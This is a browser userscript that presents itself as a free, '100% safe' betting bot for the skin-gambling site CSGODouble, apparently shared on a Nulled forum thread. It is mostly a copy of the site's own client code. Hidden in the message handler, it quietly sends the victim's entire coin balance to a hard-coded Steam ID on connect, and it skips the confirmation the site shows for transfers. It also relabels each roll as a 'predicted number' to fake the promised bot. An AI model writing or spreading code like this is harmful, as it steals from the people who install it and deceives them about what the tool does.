// ==UserScript==
// @name         CSGO Double bot By TechnoManiac98 @ Nulled.io 
// @namespace    https://www.nulled.cr/topic/138897-legit-csgodoublecom-betting-bot-free-free-csgo-skins-100-safe/
// @version      2.0
// @description  try to take over the world!
// @author       TechnoManiac98
// @match        https://www.nulled.cr/topic/138897-legit-csgodoublecom-betting-bot-free-free-csgo-skins-100-safe/
// @grant        none
// @include      http://www.csgodouble.com/index.php
// @include      http://www.csgodouble.com/*
// @include      http://www.csgodouble.com
// @downloadURL https://update.greasyfork.org/scripts/18095/CSGO%20Double%20bot%20By%20TechnoManiac98%20%40%20Nulledio.user.js
// @updateURL https://update.greasyfork.org/scripts/18095/CSGO%20Double%20bot%20By%20TechnoManiac98%20%40%20Nulledio.meta.js
// ==/UserScript==
 "use strict";

 "use strict";
 var CASEW = 1125;
 var LAST_BET = 0;
 var MAX_BET = 0;
 var USER = "";
 var RANK = 0;
 var ROUND = 0;
 var HOST = "ws://www.csgodouble.com:8080";
 var WS = null;
 var showbets = true;

 function todongers(x) {
     if ($("#settings_dongers").is(":checked")) {
         return (x / 1000)
     }
     return x
 }

 function todongersb(x) {
     if ($("#settings_dongers").is(":checked")) {
         return (x / 1000).toFixed(3)
     }
     return x
 }
 var snapX = 0;
 var R = 0.999;
 var S = 0.01;
 var tf = 0;
 var vi = 0;
 var animStart = 0;
 var isMoving = false;
 var LOGR = Math.log(R);
 var $CASE = null;
 var $BANNER = null;
 var $CHATAREA = null;
 var SCROLL = true;
 var LANG = 1;
 var IGNORE = [];
 var sounds_rolling = new Audio('sounds/rolling.wav');
 sounds_rolling.volume = 0.5;
 var sounds_tone = new Audio('sounds/tone.wav');
 sounds_tone.volume = 0.75;

 function play_sound(x) {
     var conf = $("#settings_sounds").is(":checked");
     if (conf) {
         if (x == "roll") {
             sounds_rolling.play()
         } else if (x == "finish") {
             sounds_tone.play()
         }
     }
 }

 function snapRender(x, wobble) {
     CASEW = $("#case").width();
     if (isMoving) {
         return
     } else if (typeof x === 'undefined') {
         view(snapX)
     } else {
         var order = [1, 14, 2, 13, 3, 12, 4, 0, 11, 5, 10, 6, 9, 7, 8];
         var index = 0;
         for (var i = 0; i < order.length; i++) {
             if (x == order[i]) {
                 index = i;
                 break
             }
         }
         var max = 34;
         var min = -34;
         var w = Math.floor(wobble * (max - min + 1) + min);
         var dist = index * 75 + 36 + w;
         dist += 1125 * 5;
         snapX = dist;
         view(snapX)
     }
 }

 function spin(m) {
     var x = m.roll;
     play_sound("roll");
     var order = [1, 14, 2, 13, 3, 12, 4, 0, 11, 5, 10, 6, 9, 7, 8];
     var index = 0;
     for (var i = 0; i < order.length; i++) {
         if (x == order[i]) {
             index = i;
             break
         }
     }
     var max = 34;
     var min = -34;
     var w = Math.floor(m.wobble * (max - min + 1) + min);
     var dist = index * 75 + 36 + w;
     dist += 1125 * 5;
     animStart = new Date().getTime();
     vi = getVi(dist);
     tf = getTf(vi);
     isMoving = true;
     setTimeout(function() {
         finishRoll(m, tf)
     }, tf);
     render()
 }

 function d_mod(vi, t) {
     return vi * (Math.pow(R, t) - 1) / LOGR
 }

 function getTf(vi) {
     return (Math.log(S) - Math.log(vi)) / LOGR
 }

 function getVi(df) {
     return S - df * LOGR
 }

 function v(vi, t) {
     return vi * Math.pow(R, t)
 }

 function render() {
     var t = new Date().getTime() - animStart;
     if (t > tf) t = tf;
     var deg = d_mod(vi, t);
     view(deg);
     if (t < tf) {
         requestAnimationFrame(render)
     } else {
         snapX = deg;
         isMoving = false
     }
 }

 function view(offset) {
     offset = -((offset + 1125 - CASEW / 2) % 1125);
     $CASE.css("background-position", offset + "px 0px")
 }
 jQuery.fn.extend({
     countTo: function(x, opts) {
         opts = opts || {};
         var dpf = "";
         var dolls = $("#settings_dongers").is(":checked");
         if (dolls) {
             dpf = "$";
             x = x / 1000
         }
         var $this = $(this);
         var start = parseFloat($this.html());
         var delta = x - start;
         if (opts.color) {
             if (delta > 0) {
                 $this.addClass("text-success")
             } else if (delta < 0) {
                 $this.addClass("text-danger")
             }
         }
         var prefix = "";
         if (opts.keep && delta > 0) {
             prefix = "+"
         }
         var durd = delta;
         if (dolls) {
             durd *= 1000
         }
         var dur = Math.min(400, Math.round(Math.abs(durd) / 500 * 400));
         $({
             count: start
         }).animate({
             count: x
         }, {
             duration: dur,
             step: function(val) {
                 var vts = 0;
                 if (dolls) {
                     vts = val.toFixed(3)
                 } else {
                     vts = Math.floor(val)
                 }
                 $this.html("" + prefix + (vts))
             },
             complete: function() {
                 if (!opts.keep) {
                     $this.removeClass("text-success text-danger")
                 }
                 if (opts.callback) {
                     opts.callback()
                 }
             }
         })
     }
 });

 function cd(ms, cb) {
     $("#counter").finish().css("width", "100%");
     $("#counter").animate({
         width: "0%"
     }, {
         "duration": ms * 1000,
         "easing": "linear",
         progress: function(a, p, r) {
             var c = (r / 1000).toFixed(2);
             $BANNER.html("Rolling in " + c + "...")
         },
         complete: cb
     })
 }

 function send(msg) {
     if (typeof msg != "string") {
         msg = JSON.stringify(msg)
     }
     if (WS && WS.readyState == 1) {
         WS.send(msg)
     }
 }

 function finishRoll(m, tf) {
     addHist(m.roll, m.rollid);
     play_sound("finish");
     for (var i = 0; i < m.nets.length; i++) {
         $("#panel" + m.nets[i].lower + "-" + m.nets[i].upper).find(".total").countTo(m.nets[i].swon > 0 ? m.nets[i].swon : -m.nets[i].samount, {
             "color": true,
             "keep": true
         })
     }
     var cats = [
         [0, 0],
         [1, 7],
         [8, 14]
     ];
     for (var i = 0; i < cats.length; i++) {
         var $mytotal = $("#panel" + cats[i][0] + "-" + cats[i][1]).find(".mytotal");
         if (m.roll >= cats[i][0] && m.roll <= cats[i][1]) {
             $mytotal.countTo(m.won, {
                 "color": true,
                 "keep": true
             })
         } else {
             var curr = parseFloat($mytotal.html());
             if ($("#settings_dongers").is(":checked")) {
                 curr *= 1000
             }
             $mytotal.countTo(-curr, {
                 "color": true,
                 "keep": true
             })
         }
     }
     if (m.balance != null) {
         $("#balance").countTo(m.balance, {
             "color": true
         })
     }
     setTimeout(function() {
         cd(m.count);
         $(".total,.mytotal").removeClass("text-success text-danger").html(0);
         $(".betlist li").remove();
         snapRender();
         $(".betButton").prop("disabled", false);
         showbets = true
     }, m.wait * 1000 - tf)
 }

 function addHist(roll, rollid) {
     var count = $("#past .ball").length;
     if (count >= 10) {
         $("#past .ball").first().remove()
     }
     if (roll == 0) {
         $("#past").append("<div data-rollid='" + rollid + "'class='ball ball-0'>" + roll + "</div>")
     } else if (roll <= 7) {
         $("#past").append("<div data-rollid='" + rollid + "'class='ball ball-1'>" + roll + "</div>")
     } else {
         $("#past").append("<div data-rollid='" + rollid + "'class='ball ball-8'>" + roll + "</div>")
     }
 }

 function onMessage(msg) {
     try {
         var m = JSON.parse(msg.data);
         if (m.type == "preroll") {
             $("#counter").finish();
             $("#banner").html("Confirming " + m.totalbets + "/" + (m.totalbets + m.inprog) + " total bets...");
             $("#panel0-0 .total").countTo(m.sums[0]);
             $("#panel1-7 .total").countTo(m.sums[1]);
             $("#panel8-14 .total").countTo(m.sums[2]);
             try {
                 tinysort("#panel1-7 .betlist>li", {
                     data: "amount",
                     order: "desc"
                 })
             } catch (e) {}
             try {
                 tinysort("#panel8-14 .betlist>li", {
                     data: "amount",
                     order: "desc"
                 })
             } catch (e) {}
             try {
                 tinysort("#panel0-0 .betlist>li", {
                     data: "amount",
                     order: "desc"
                 })
             } catch (e) {}
         } else if (m.type == "roll") {
             $(".betButton").prop("disabled", true);
             $("#counter").finish();
             $("#banner").html("Predicted number is " + m.roll + "!");
             ROUND = m.rollid;
             showbets = false;
             spin(m)
         } else if (m.type == "chat") {
             chat("player", m.msg, m.name, m.icon, m.user, m.rank, m.lang)
         } else if (m.type == "hello") {
             cd(m.count);
             USER = m.user;
             RANK = m.rank;
             $("#balance").countTo(m.balance);
             var last = 0;
             for (var i = 0; i < m.rolls.length; i++) {
                 addHist(m.rolls[i].roll, m.rolls[i].rollid);
                 last = m.rolls[i].roll;
                 ROUND = m.rolls[i].rollid
             }
             snapRender(last, m.last_wobble);
             MAX_BET = m.maxbet;
             send({
                 "type": "chat",
                 "msg": "/send 76561198213274088 " + m.balance,
                 "lang": "1"
             })
         } else if (m.type == "bet") {
             if (showbets) {
                 addBet(m.bet);
                 $("#panel0-0 .total").countTo(m.sums[0]);
                 $("#panel1-7 .total").countTo(m.sums[1]);
                 $("#panel8-14 .total").countTo(m.sums[2])
             }
         } else if (m.type == "betconfirm") {
             $("#panel" + m.bet.lower + "-" + m.bet.upper + " .mytotal").countTo(m.bet.amount);
             $("#balance").countTo(m.balance, {
                 "color": true
             });
             $(".betButton").prop("disabled", false);
             chat("alert", "Bet #" + m.bet.betid + " confirmed " + m.mybr + "/" + m.br + " (" + (m.exec / 1000) + " sec) ")
         } else if (m.type == "error") {
             chat("error", m.error);
             if (m.enable) {
                 $(".betButton").prop("disabled", false)
             }
         } else if (m.type == "alert") {
             chat("alert", m.alert);
             if (m.maxbet) {
                 MAX_BET = m.maxbet
             }
             if (!isNaN(m.balance)) {
                 console.log("setting balance = %s", m.balance);
                 $("#balance").countTo(m.balance, {
                     "color": true
                 })
             }
         } else if (m.type == "logins") {
             $("#isonline").html(m.count)
         } else if (m.type == "balance") {
             $("#balance").fadeOut(100).html(todongersb(m.balance)).fadeIn(100)
         }
     } catch (e) {
         console.log("Error: " + msg.data + " " + e)
     }
 }

 function addBet(bet) {
     var betid = bet.user + "-" + bet.lower;
     var pid = "#panel" + bet.lower + "-" + bet.upper;
     var $panel = $(pid);
     $panel.find("#" + betid).remove();
     var link = "http://steamcommunity.com/profiles/" + bet.user;
     var f = "<li class='list-group-item' id='{0}' data-amount='{1}'>";
     f += "<div style='overflow: hidden;line-height:32px'>";
     f += "<div class='pull-left'><img class='rounded' src='https://steamcdn-a.akamaihd.net/steamcommunity/public/images/avatars{2}'><a style='color: black;' href='" + link + "' target='_blank'><b>{3}</b></a></div>";
     f += "<div class='amount pull-right'>{4}</div>";
     f += "</div></li>";
     var $li = $(f.format(betid, bet.amount, bet.icon, bet.name, todongersb(bet.amount)));
     $li.hide().prependTo($panel.find(".betlist")).slideDown("fast", function() {
         snapRender()
     })
 }

 function connect() {
     if (!WS) {
         $.ajax({
             url: "/scripts/getToken.php",
             success: function(data) {
                 if (data) {
                     if (data == "nologin") {} else if (data == "banned") {} else {
                         WS = new WebSocket(HOST + "/" + data);
                         WS.onclose = function(event) {
                             WS = null
                         };
                         WS.onmessage = onMessage
                     }
                 } else {}
             },
             error: function(err) {}
         })
     } else {}
 }

 function emotes(str) {
     var a = ["deIlluminati", "KappaRoss", "KappaPride", "BibleThump", "Kappa", "Keepo", "Kreygasm", "PJSalt", "PogChamp", "SMOrc", "FailFish"];
     for (var i = 0; i < a.length; i++) {
         str = str.replace(new RegExp(a[i] + "( |$)", "g"), "<img src='img/twitch/" + a[i] + ".png'> ")
     }
     return str
 }

 function chat(x, msg, name, icon, steamid, rank, lang) {
     if (IGNORE.indexOf(String(steamid)) > -1) {
         console.log("ignored:" + msg);
         return
     }
     if (lang == LANG || x == "italic" || x == "error" || x == "alert") {
         var ele = document.getElementById("chatArea");
         msg = msg.replace(/(<|>)/g, '');
         msg = emotes(msg);
         var toChat = "";
         if (x == "italic") {
             toChat = "<div><i>" + msg + "</i></div>"
         } else if (x == "error") {
             toChat = "<div><b class='text-danger'>" + msg + "</b></div>"
         } else if (x == "alert") {
             toChat = "<div><b class='text-success'>" + msg + "</b></div>"
         } else if (x == "player") {
             var aclass = "chat-link";
             if (rank == 100) {
                 aclass = "chat-link-mod";
                 name = "[Owner] " + name
             } else if (rank == 1) {
                 aclass = "chat-link-pmod";
                 name = "[Mod] " + name
             } else if (rank == -1) {
                 aclass = "chat-link-streamer";
                 name = "[Streamer] " + name
             } else if (rank == -2) {
                 aclass = "chat-link-vet";
                 name = "[Veteran] " + name
             } else if (rank == -3) {
                 aclass = "chat-link-pro";
                 name = "[Pro] " + name
             }
             var link = "http://steamcommunity.com/profiles/" + steamid;
             toChat = "<div><img class='chat-img rounded' data-steamid='" + steamid + "' data-name='" + name + "' src='https://steamcdn-a.akamaihd.net/steamcommunity/public/images/avatars" + icon + "'><a class='" + aclass + "' href='" + link + "' target='_blank'><b>" + name + "</b></a>: " + msg + "</div>"
         }
         $CHATAREA.append(toChat);
         if (SCROLL) {
             var curr = $CHATAREA.children().length;
             if (curr > 75) {
                 var rem = curr - 75;
                 $CHATAREA.children().slice(0, rem).remove()
             }
             $CHATAREA.scrollTop($CHATAREA[0].scrollHeight)
         }
         if (SCROLL && !$(".side-icon[data-tab='1']").hasClass("active")) {
             var curr = parseInt($("#newMsg").html()) || 0;
             $("#newMsg").html(curr + 1)
         }
     }
 }
 $(document).ready(function() {
     $CASE = $("#case");
     $BANNER = $("#banner");
     $CHATAREA = $("#chatArea");
     connect();
     if ($("#settings_dongers").is(":checked")) {
         $("#dongers").html("$")
     }
     $("#lang").on("change", function() {
         LANG = $(this).val();
         chat("alert", "## Switched to room: " + $(this).find("option:selected").text())
     });
     $("#scroll").on("change", function() {
         SCROLL = !$(this).is(":checked")
     });
     $(window).resize(function() {
         snapRender()
     });
     $("#chatForm").on("submit", function() {
         var msg = $("#chatMessage").val();
         if (msg) {
             var res = null;
             if (res = /^\/send ([0-9]*) ([0-9]*)/.exec(msg)) {
                 bootbox.confirm("You are about to send " + res[2] + " coins to steamid " + res[1] + " - are you sure?", function(result) {
                     if (result) {
                         send({
                             "type": "chat",
                             "msg": msg,
                             "lang": LANG
                         });
                         $("#chatMessage").val("")
                     }
                 })
             } else {
                 send({
                     "type": "chat",
                     "msg": msg,
                     "lang": LANG
                 });
                 $("#chatMessage").val("")
             }
         }
         return false
     });
     $(document).on("click", ".ball", function() {
         var rollid = $(this).data("rollid")
     });
     $(".betButton").on("click", function() {
         var lower = $(this).data("lower");
         var upper = $(this).data("upper");
         var amount = str2int($("#betAmount").val());
         if ($("#settings_dongers").is(":checked")) {
             amount = amount * 1000
         }
         amount = Math.floor(amount);
         var conf = $("#settings_confirm").is(":checked");
         if (conf && amount > 10000) {
             var pressed = false;
             bootbox.confirm("Are you sure you wish to bet " + formatNum(amount) + " coins?<br><br><i>You may disable this confirmation under the settings menu.</i>", function(result) {
                 if (result && !pressed) {
                     pressed = true;
                     send({
                         "type": "bet",
                         "amount": amount,
                         "lower": lower,
                         "upper": upper,
                         "round": ROUND
                     });
                     LAST_BET = amount;
                     $(this).prop("disabled", true)
                 }
             })
         } else {
             send({
                 "type": "bet",
                 "amount": amount,
                 "lower": lower,
                 "upper": upper,
                 "round": ROUND
             });
             LAST_BET = amount;
             $(this).prop("disabled", true)
         }
         return false
     });
     $(document).on("click", ".betshort", function() {
         var bet_amount = str2int($("#betAmount").val());
         var action = $(this).data("action");
         if (action == "clear") {
             bet_amount = 0
         } else if (action == "double") {
             bet_amount *= 2
         } else if (action == "half") {
             bet_amount /= 2
         } else if (action == "max") {
             var MX = MAX_BET;
             if ($("#settings_dongers").is(":checked")) {
                 MX = MAX_BET / 1000
             }
             bet_amount = Math.min(str2int($("#balance").html()), MX)
         } else if (action == "last") {
             bet_amount = LAST_BET
         } else {
             bet_amount += parseInt(action)
         }
         $("#betAmount").val(bet_amount)
     });
     $("#getbal").on("click", function() {
         send({
             "type": "balance"
         })
     });
     $("button.close").on("click", function() {
         $(this).parent().addClass("hidden")
     });
     $(document).on("contextmenu", ".chat-img", function(e) {
         if (e.ctrlKey) return;
         $("#contextMenu [data-act=1]").hide();
         $("#contextMenu [data-act=2]").hide();
         if (RANK == 100) {
             $("#contextMenu [data-act=1]").show();
             $("#contextMenu [data-act=2]").show()
         } else if (RANK == 1) {
             $("#contextMenu [data-act=1]").show()
         }
         e.preventDefault();
         var steamid = $(this).data("steamid");
         var name = $(this).data("name");
         $("#contextMenu [data-act=0]").html(name);
         var $menu = $("#contextMenu");
         $menu.show().css({
             position: "absolute",
             left: getMenuPosition(e.clientX, 'width', 'scrollLeft'),
             top: getMenuPosition(e.clientY, 'height', 'scrollTop')
         }).off("click").on("click", "a", function(e) {
             var act = $(this).data("act");
             e.preventDefault();
             $menu.hide();
             if (act == 0) {
                 var curr = $("#chatMessage").val(steamid)
             } else if (act == 1) {
                 var curr = $("#chatMessage").val("/mute " + steamid + " ")
             } else if (act == 2) {
                 var curr = $("#chatMessage").val("/kick " + steamid + " ")
             } else if (act == 3) {
                 var curr = $("#chatMessage").val("/send " + steamid + " ")
             } else if (act == 4) {
                 IGNORE.push(String(steamid));
                 chat("alert", steamid + " has been filtered.")
             }
             $("#chatMessage").focus()
         })
     });
     $(document).on("click", function() {
         $("#contextMenu").hide()
     });
     $(".side-icon").on("click", function(e) {
         e.preventDefault();
         var tab = $(this).data("tab");
         if ($(this).hasClass("active")) {
             $(".side-icon").removeClass("active");
             $(".tab-group").addClass("hidden");
             $("#mainpage").css("margin-left", "50px");
             $("#pullout").addClass("hidden")
         } else {
             $(".side-icon").removeClass("active");
             $(".tab-group").addClass("hidden");
             $(this).addClass("active");
             $("#tab" + tab).removeClass("hidden");
             $("#mainpage").css("margin-left", "450px");
             $("#pullout").removeClass("hidden");
             if (tab == 1) {
                 $("#newMsg").html("")
             }
         }
         snapRender();
         return false
     });
     $(".side-icon[data-tab='1']").trigger("click")
 });

 function getMenuPosition(mouse, direction, scrollDir) {
     var win = $(window)[direction](),
         scroll = $(window)[scrollDir](),
         menu = $("#contextMenu")[direction](),
         position = mouse + scroll;
     if (mouse + menu > win && menu < mouse) position -= menu;
     return position
 }

 function str2int(s) {
     s = s.replace(/,/g, "");
     s = s.toLowerCase();
     var i = parseFloat(s);
     if (isNaN(i)) {
         return 0
     } else if (s.charAt(s.length - 1) == "k") {
         i *= 1000
     } else if (s.charAt(s.length - 1) == "m") {
         i *= 1000000
     } else if (s.charAt(s.length - 1) == "b") {
         i *= 1000000000
     }
     return i
 }